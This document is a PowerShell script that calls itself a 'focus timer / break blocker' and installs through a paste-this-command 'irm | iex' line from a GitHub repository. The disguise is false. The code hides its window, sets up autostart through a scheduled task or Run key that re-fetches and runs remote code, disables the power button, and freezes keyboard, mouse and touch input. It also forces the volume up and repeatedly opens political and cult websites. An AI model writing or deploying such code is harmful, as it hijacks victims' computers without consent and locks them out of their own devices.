<#
  Focus timer / break blocker

  INSTALL + START (paste into any PowerShell window, then close it):
    irm https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1 | iex

  STOP + UNINSTALL:
    $env:TR_ACTION = 'stop'; irm https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1 | iex

  How it works: when run from the web it saves itself locally, starts a hidden
  copy of itself as the worker, then exits. The worker registers autostart and
  runs the reminder loop with no visible window.
#>

# ================= CONFIG =================
$BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
$ScriptUrl = "$BaseUrl/reminders.ps1"   # must match this script's filename in the repo

$Sites = @{
    1 = "https://heavensgate.com/"
    2 = "https://action.aipac.org/aipac-pac-donate"
    3 = "https://www.palantir.com/platforms/gotham/"
    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
    5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
}

$MinSeconds            = 10     # random gap between reminders
$MaxSeconds            = 120
$AvoidRepeat           = $true  # never pick the same task twice in a row
$MinimizeAll           = $true  # show the desktop at each reminder
$ShowConsole           = $false # $true = visible window + console output (debugging)

$Volume                = 0.5    # system volume during reminders (0.0 - 1.0)
$SetSystemVolume       = $true
$FreezeVolume          = $true  # keep volume pinned and unmuted while audio plays
$MaxAudioWait          = 60     # never wait longer than this for audio (seconds)

$FreezeInput           = $true  # block keyboard, mouse and touch during the break
$PostSiteFreezeSeconds = 5      # keep input frozen this long after the website opens
$BlockPowerButton      = $true  # set the power button to "do nothing" during the freeze

$TaskName              = "TaskReminder"
$DailyStartTime        = "08:00"  # autostart: daily at this time, plus every logon
$LogonDelay            = "PT20S"  # wait after login before starting
# ==========================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$IsWorker  = $args -contains '-Worker'
$Dir       = Join-Path $env:TEMP "TaskReminder"
$LogFile   = Join-Path $Dir "log.txt"
$LocalCopy = Join-Path $Dir "reminders.ps1"
$PsExe     = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$RunKey    = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$whoami    = "$env:USERDOMAIN\$env:USERNAME"

New-Item -ItemType Directory -Path $Dir -Force | Out-Null

function Log($m) {
    "$(Get-Date -Format 'HH:mm:ss') $m" | Add-Content $LogFile
    if ($ShowConsole) { Write-Host $m }
}

# ---- Power button: "do nothing" during the freeze; originals saved to disk so a crash can be undone ----
$PbFile = Join-Path $Dir "powerbutton.json"

function Get-PowerButtonValues {
    $txt = (powercfg /query SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION) -join "`n"
    $hex = [regex]::Matches($txt, '0x[0-9a-fA-F]{8}')   # last two = current AC, current DC (language independent)
    if ($hex.Count -lt 2) { throw "could not read the power button setting" }
    @{ AC = [Convert]::ToInt32($hex[$hex.Count - 2].Value.Substring(2), 16)
       DC = [Convert]::ToInt32($hex[$hex.Count - 1].Value.Substring(2), 16) }
}

function Set-PowerButtonValues($ac, $dc) {
    powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION $ac | Out-Null
    powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS PBUTTONACTION $dc | Out-Null
    powercfg /setactive SCHEME_CURRENT | Out-Null
}

function Block-PowerButton {
    if (-not $BlockPowerButton -or (Test-Path $PbFile)) { return }
    try {
        Get-PowerButtonValues | ConvertTo-Json | Set-Content $PbFile
        Set-PowerButtonValues 0 0   # 0 = do nothing
        Log "Power button blocked"
    } catch { Log "POWER BUTTON BLOCK FAILED: $($_.Exception.Message)" }
}

function Restore-PowerButton {
    if (-not (Test-Path $PbFile)) { return }
    try {
        $v = Get-Content $PbFile -Raw | ConvertFrom-Json
        Set-PowerButtonValues $v.AC $v.DC
        Remove-Item $PbFile -Force
        Log "Power button restored"
    } catch { Log "POWER BUTTON RESTORE FAILED: $($_.Exception.Message)" }
}

# =====================================================================
#  LAUNCHER MODE (run from the web, or by the autostart entry)
#  Saves the script locally, starts a hidden worker, and exits.
# =====================================================================
if (-not $IsWorker) {

    # ---- Stop / uninstall ----
    if ($env:TR_ACTION -eq 'stop') {
        $pidFile = Join-Path $Dir "pid.txt"
        if (Test-Path $pidFile) {
            Stop-Process -Id ([int](Get-Content $pidFile)) -Force -ErrorAction SilentlyContinue
        }
        Restore-PowerButton   # in case it was stopped mid-freeze
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Remove-ItemProperty $RunKey -Name $TaskName -ErrorAction SilentlyContinue
        Write-Host "Task reminder stopped and autostart removed."
        return
    }

    # ---- Save a local copy (retry a few times; network may still be coming up) ----
    $saved = $false
    for ($a = 1; $a -le 5 -and -not $saved; $a++) {
        try {
            Invoke-WebRequest -UseBasicParsing $ScriptUrl -OutFile $LocalCopy -ErrorAction Stop
            $saved = (Get-Item $LocalCopy).Length -gt 1000
        } catch {
            Log "SCRIPT DOWNLOAD FAILED (attempt $a/5): $($_.Exception.Message)"
            Start-Sleep -Seconds (2 * $a)
        }
    }
    if (-not $saved) { Write-Host "Could not download the script. Check your connection."; return }

    # ---- Start the worker in a hidden window ----
    $style = if ($ShowConsole) { 'Normal' } else { 'Hidden' }
    Start-Process $PsExe -WindowStyle $style `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$LocalCopy`" -Worker"

    Write-Host "Task reminder is running in the background. You can close this window."
    return
}

# =====================================================================
#  WORKER MODE (hidden background process)
# =====================================================================

Log "--- worker started as $whoami. Language mode: $($ExecutionContext.SessionState.LanguageMode), PS $($PSVersionTable.PSVersion)"

# ---- Only one copy at a time ----
$mutex = New-Object System.Threading.Mutex($false, "Local\TaskReminderLoop")
if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
$PID | Out-File (Join-Path $Dir "pid.txt")
Restore-PowerButton   # undo a block left over from a previous crash or kill

# Compile C# helpers; returns $true/$false so one failure never stops the rest
function Add-Native($name, $code, $refs) {
    try {
        $p = @{ TypeDefinition = $code; ErrorAction = 'Stop' }
        if ($refs) { $p.ReferencedAssemblies = $refs }
        Add-Type @p
        $true
    } catch { Log "$name SETUP FAILED: $($_.Exception.Message)"; $false }
}

# ---- Autostart: scheduled task (logon + daily), falling back to the HKCU Run key ----
# The autostart command re-downloads the latest script from GitHub each time.
$LaunchArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm '$ScriptUrl' | iex`""
$taskOk     = $false
try {
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        $taskOk = $true
    } else {
        $logon = New-ScheduledTaskTrigger -AtLogOn -User $whoami
        $logon.Delay = $LogonDelay
        Register-ScheduledTask -TaskName $TaskName -Force -ErrorAction Stop `
            -Action    (New-ScheduledTaskAction -Execute $PsExe -Argument $LaunchArgs) `
            -Trigger   @($logon, (New-ScheduledTaskTrigger -Daily -At $DailyStartTime)) `
            -Settings  (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit ([TimeSpan]::Zero)) `
            -Principal (New-ScheduledTaskPrincipal -UserId $whoami -LogonType Interactive -RunLevel Limited) | Out-Null
        $taskOk = [bool](Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)
        Log "AUTOSTART: scheduled task created: $taskOk"
    }
} catch { Log "AUTOSTART TASK FAILED: $($_.Exception.Message)" }

if (-not $taskOk) {
    try {
        Set-ItemProperty $RunKey -Name $TaskName -Value "`"$PsExe`" $LaunchArgs" -ErrorAction Stop
        Log "AUTOSTART: fell back to HKCU Run key"
    } catch { Log "AUTOSTART RUN KEY FAILED: $($_.Exception.Message)" }
}

# ---- Wait for network (up to 60s), then download assets with retries ----
for ($n = 0; -not [Net.NetworkInformation.NetworkInterface]::GetIsNetworkAvailable() -and $n -lt 60; $n++) { Start-Sleep -Seconds 1 }

foreach ($f in (1..5 | ForEach-Object { "image$_.jpg"; "audio$_.wav" })) {
    $dest = Join-Path $Dir $f
    for ($a = 1; $a -le 4; $a++) {
        try {
            Invoke-WebRequest -UseBasicParsing "$BaseUrl/$f" -OutFile "$dest.tmp" -ErrorAction Stop
            $len = (Get-Item "$dest.tmp").Length
            if ($len -lt 1000) { throw "file is only $len bytes (not a real file?)" }
            Move-Item "$dest.tmp" $dest -Force
            Log "Downloaded $f ($len bytes)"
            break
        } catch {
            Log "DOWNLOAD FAILED (attempt $a/4) $f : $($_.Exception.Message)"
            Remove-Item "$dest.tmp" -Force -ErrorAction SilentlyContinue
            if ($a -lt 4) { Start-Sleep -Seconds (2 * $a) }
        }
    }
}

# ---- Wallpaper ----
$wpOk = Add-Native "WALLPAPER" @"
using System.Runtime.InteropServices;
public class WP {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int a, int b, string c, int d);
}
"@
if ($wpOk) {
    Set-ItemProperty "HKCU:\Control Panel\Desktop" WallpaperStyle "10"
    Set-ItemProperty "HKCU:\Control Panel\Desktop" TileWallpaper  "0"
}

# ---- Input freeze: keyboard + mouse hooks (no admin needed), BlockInput as a bonus if elevated ----
$freezeOk = $FreezeInput -and (Add-Native "INPUT FREEZE" @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

public class InputFreezer {
    delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll", SetLastError=true)] static extern IntPtr SetWindowsHookEx(int id, HookProc fn, IntPtr mod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
    [DllImport("user32.dll")] static extern bool BlockInput(bool block);
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)] static extern IntPtr GetModuleHandle(string name);
    [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
    [DllImport("user32.dll")] static extern int GetMessage(out MSG m, IntPtr hWnd, uint min, uint max);
    [DllImport("user32.dll")] static extern bool PostThreadMessage(uint tid, uint msg, IntPtr w, IntPtr l);
    [StructLayout(LayoutKind.Sequential)]
    struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int x; public int y; }

    static HookProc kbProc = KbCallback, msProc = MsCallback;
    static IntPtr hKb = IntPtr.Zero, hMs = IntPtr.Zero;
    static Thread t;
    static uint tid;
    public static bool Ok, BlockInputOk;
    public static int LastError;

    static IntPtr KbCallback(int n, IntPtr w, IntPtr l) { return n >= 0 ? (IntPtr)1 : CallNextHookEx(hKb, n, w, l); }
    static IntPtr MsCallback(int n, IntPtr w, IntPtr l) { return n >= 0 ? (IntPtr)1 : CallNextHookEx(hMs, n, w, l); }

    public static bool Start() {
        if (t != null) return Ok || BlockInputOk;
        var ready = new ManualResetEvent(false);
        Ok = false; BlockInputOk = false;
        t = new Thread(() => {
            tid = GetCurrentThreadId();
            IntPtr mod = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            hKb = SetWindowsHookEx(13, kbProc, mod, 0);   // WH_KEYBOARD_LL
            if (hKb == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
            hMs = SetWindowsHookEx(14, msProc, mod, 0);   // WH_MOUSE_LL
            if (hMs == IntPtr.Zero) LastError = Marshal.GetLastWin32Error();
            Ok = hKb != IntPtr.Zero && hMs != IntPtr.Zero;
            try { BlockInputOk = BlockInput(true); } catch { }
            ready.Set();
            if (Ok || BlockInputOk) { MSG m; while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0) { } }
            if (BlockInputOk) { try { BlockInput(false); } catch { } }
            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
            hKb = IntPtr.Zero; hMs = IntPtr.Zero;
        });
        t.IsBackground = true;
        t.Start();
        ready.WaitOne(3000);
        if (!Ok && !BlockInputOk) { Stop(); return false; }
        return true;
    }

    public static void Stop() {
        if (t == null) return;
        PostThreadMessage(tid, 0x0012, IntPtr.Zero, IntPtr.Zero);   // WM_QUIT
        if (!t.Join(2000)) {
            if (hKb != IntPtr.Zero) UnhookWindowsHookEx(hKb);
            if (hMs != IntPtr.Zero) UnhookWindowsHookEx(hMs);
        }
        t = null; Ok = false; BlockInputOk = false;
    }
}
"@)

# ---- Touch shield: near-invisible full-screen window that swallows touch/pen input ----
$shieldOk = $FreezeInput -and (Add-Native "TOUCH SHIELD" @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public class TouchShield {
    [DllImport("user32.dll")] static extern bool SetProcessDPIAware();
    static Form f;
    static Thread t;

    public static void Start() {
        if (t != null) return;
        try { SetProcessDPIAware(); } catch { }
        var ready = new ManualResetEvent(false);
        t = new Thread(() => {
            f = new Form();
            f.FormBorderStyle = FormBorderStyle.None;
            f.StartPosition = FormStartPosition.Manual;
            f.Bounds = SystemInformation.VirtualScreen;
            f.TopMost = true;
            f.ShowInTaskbar = false;
            f.BackColor = Color.Black;
            f.Opacity = 0.02;
            f.Shown += (s, e) => { ready.Set(); };
            Application.Run(f);
        });
        t.SetApartmentState(ApartmentState.STA);
        t.IsBackground = true;
        t.Start();
        ready.WaitOne(3000);
    }

    public static void Stop() {
        if (t == null) return;
        try { if (f != null && f.IsHandleCreated) f.Invoke((MethodInvoker)delegate { f.Close(); }); } catch { }
        t.Join(2000);
        t = null; f = null;
    }
}
"@ @("System.Windows.Forms", "System.Drawing"))

# ---- System volume (Windows Core Audio) ----
$volOk = $SetSystemVolume -and (Add-Native "VOLUME" @"
using System.Runtime.InteropServices;

[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IAudioEndpointVolume {
    int f(); int g(); int h(); int i();
    int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
    int j();
    int GetMasterVolumeLevelScalar(out float pfLevel);
    int k(); int l(); int m(); int n();
    int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
    int GetMute(out bool pbMute);
}

[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDevice {
    int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
}

[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IMMDeviceEnumerator {
    int f();
    int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
}

[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
class MMDeviceEnumeratorComObject { }

public class SysVol {
    static IAudioEndpointVolume Vol() {
        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
        IMMDevice dev = null;
        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(0, 1, out dev));
        IAudioEndpointVolume epv = null;
        var epvid = typeof(IAudioEndpointVolume).GUID;
        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, 23, 0, out epv));
        return epv;
    }
    public static float Volume {
        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }
    }
    public static bool Mute {
        get { bool m; Marshal.ThrowExceptionForHR(Vol().GetMute(out m)); return m; }
        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
    }
}
"@)

# ---- Audio player ----
$player = $null
try {
    Add-Type -AssemblyName PresentationCore -ErrorAction Stop
    $player = New-Object System.Windows.Media.MediaPlayer
} catch { Log "AUDIO SETUP FAILED: $($_.Exception.Message)" }

# ---- Helpers ----
$script:frozen   = $false
$script:shielded = $false

function Start-Freeze {
    Block-PowerButton
    if ($freezeOk -and -not $script:frozen) {
        try {
            $script:frozen = [InputFreezer]::Start()
            Log "Input freeze: $($script:frozen) (hooks: $([InputFreezer]::Ok), BlockInput: $([InputFreezer]::BlockInputOk), err: $([InputFreezer]::LastError))"
        } catch { Log "INPUT FREEZE ERROR: $($_.Exception.Message)" }
    }
    if ($shieldOk -and -not $script:shielded) {
        try { [TouchShield]::Start(); $script:shielded = $true; Log "Touch shield on" }
        catch { Log "TOUCH SHIELD ERROR: $($_.Exception.Message)" }
    }
}

function Stop-Freeze {
    if ($script:frozen)   { try { [InputFreezer]::Stop() } catch {}; $script:frozen   = $false; Log "Input released" }
    if ($script:shielded) { try { [TouchShield]::Stop() }  catch {}; $script:shielded = $false; Log "Touch shield off" }
    Restore-PowerButton
}

function Pin-Volume {
    if (-not ($FreezeVolume -and $volOk)) { return }
    try {
        if ([SysVol]::Mute) { [SysVol]::Mute = $false }
        if ([math]::Abs([SysVol]::Volume - $Volume) -gt 0.01) { [SysVol]::Volume = [single]$Volume }
    } catch {}
}

# Starts audio$n.wav; returns how long to wait for it (ms), 0 if nothing is playing
function Start-Audio($n) {
    if (-not $player) { return 0 }
    $file = Join-Path $Dir "audio$n.wav"
    try {
        $player.Stop(); $player.Close()
        $script:player = New-Object System.Windows.Media.MediaPlayer
        $script:player.Open([Uri]$file)
        $script:player.Volume = 1.0   # loudness is set by the system volume
        for ($t = 0; -not $script:player.NaturalDuration.HasTimeSpan -and $t -lt 30; $t++) { Start-Sleep -Milliseconds 100 }
        if (-not $script:player.NaturalDuration.HasTimeSpan) { Log "AUDIO FAILED to load $file"; return 0 }
        if ($volOk) {
            try { [SysVol]::Mute = $false; [SysVol]::Volume = [single]$Volume }
            catch { Log "VOLUME SET FAILED: $($_.Exception.Message)" }
        }
        $dur = $script:player.NaturalDuration.TimeSpan.TotalSeconds
        $script:player.Play()
        Log "Playing audio$n.wav ($([int]$dur)s)"
        return [int]([math]::Min($dur + 0.5, $MaxAudioWait) * 1000)
    } catch { Log "AUDIO FAILED: $($_.Exception.Message)"; return 0 }
}

# ---- Main loop ----
$last = 0
while ($true) {
    do { $x = Get-Random -Minimum 1 -Maximum 6 } while ($AvoidRepeat -and $x -eq $last)
    $last = $x
    Log "Task $x"

    # 1. Wallpaper
    if ($wpOk) {
        try { if (-not [WP]::SystemParametersInfo(20, 0, (Join-Path $Dir "image$x.jpg"), 3)) { Log "Wallpaper call failed for image$x.jpg" } }
        catch { Log "WALLPAPER FAILED: $($_.Exception.Message)" }
    }

    # 2. Show the desktop
    if ($MinimizeAll) {
        try { (New-Object -ComObject Shell.Application).MinimizeAll() }
        catch { Log "MINIMISE FAILED: $($_.Exception.Message)" }
    }

    # 3. Audio, with input frozen from the start until a few seconds after the website opens
    $waitMs = Start-Audio $x
    try {
        Start-Freeze
        for ($end = (Get-Date).AddMilliseconds($waitMs); (Get-Date) -lt $end; ) { Pin-Volume; Start-Sleep -Milliseconds 100 }

        try { Start-Process $Sites[$x] -ErrorAction Stop }
        catch { Log "OPEN SITE FAILED: $($_.Exception.Message)" }

        if ($script:frozen -or $script:shielded) { Start-Sleep -Seconds $PostSiteFreezeSeconds }
    } finally { Stop-Freeze }

    Start-Sleep -Seconds (Get-Random -Minimum $MinSeconds -Maximum ($MaxSeconds + 1))
}
